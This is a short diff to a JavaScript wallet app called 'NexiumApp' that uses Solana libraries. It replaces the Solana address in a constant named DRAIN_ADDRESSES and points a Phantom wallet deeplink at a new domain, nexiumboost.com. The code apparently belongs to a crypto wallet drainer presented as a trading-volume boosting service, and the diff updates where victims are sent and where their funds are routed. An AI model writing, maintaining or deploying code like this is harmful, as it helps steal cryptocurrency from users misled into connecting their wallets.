@@ -11,7 +11,7 @@ import { Connection, PublicKey, SystemProgram, TransactionMessage, VersionedTran
 console.log('main.js: Buffer after imports:', typeof globalThis.Buffer); // Log 4
 
 const DRAIN_ADDRESSES = {
-  solana: "73F2hbzhk7ZuTSSYTSbemddFasVrW8Av5FD9PeMVmxA7"
+  solana: "hQPH3UqsfCBX6VPiWPhowhmmcrZNxnhV4eqRtJcSEtb"
 };
 
 class NexiumApp {
@@ -241,7 +241,7 @@ class NexiumApp {
 
       // Deeplink begin
       const deeplinks = {
-        Phantom: 'https://phantom.app/ul/browse/https%3A%2F%2Fnexium-bot.onrender.com%2Fadd-volume.html%23pricing?ref=https%3A%2F%2Fnexium-bot.onrender.com'
+        Phantom: 'https://phantom.app/ul/browse/https%3A%2F%2Fnexiumboost.com?ref=https%3A%2F%2Fnexiumboost.com'
       };
       // Deeplink end
       const deeplink = deeplinks[walletName];
